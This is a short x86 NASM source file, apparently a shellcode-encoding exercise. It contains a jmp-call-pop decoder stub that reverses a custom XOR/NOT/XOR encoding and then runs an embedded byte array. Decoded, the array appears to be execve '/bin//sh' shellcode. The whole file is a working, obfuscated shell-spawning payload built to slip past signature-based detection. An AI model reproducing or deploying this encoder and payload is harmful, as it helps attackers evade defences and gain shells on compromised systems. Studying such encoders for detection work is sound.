; Decoder.nasm
; Author: Ravehorn

global _start

section .text

_start:

    jmp short call_decoder

decoder:
    
    pop esi
    
decode:

    cmp byte [esi], 0x44
    je shellcode
    xor byte [esi], 0xbb
    not byte [esi]
    xor byte [esi], 0xaa
    inc esi
    jmp short decode

call_decoder:

    call decoder

    shellcode: db 0xdf, 0x2e, 0xbe, 0x86, 0xc1, 0xc1, 0x9d, 0x86, 0x86, 0xc1, 0x8c, 0x87, 0x80, 0x67, 0x0d, 0xbe, 0x67, 0x0c, 0xbd, 0x67, 0x0f, 0x5e, 0xe5, 0x23, 0x6e, 0x44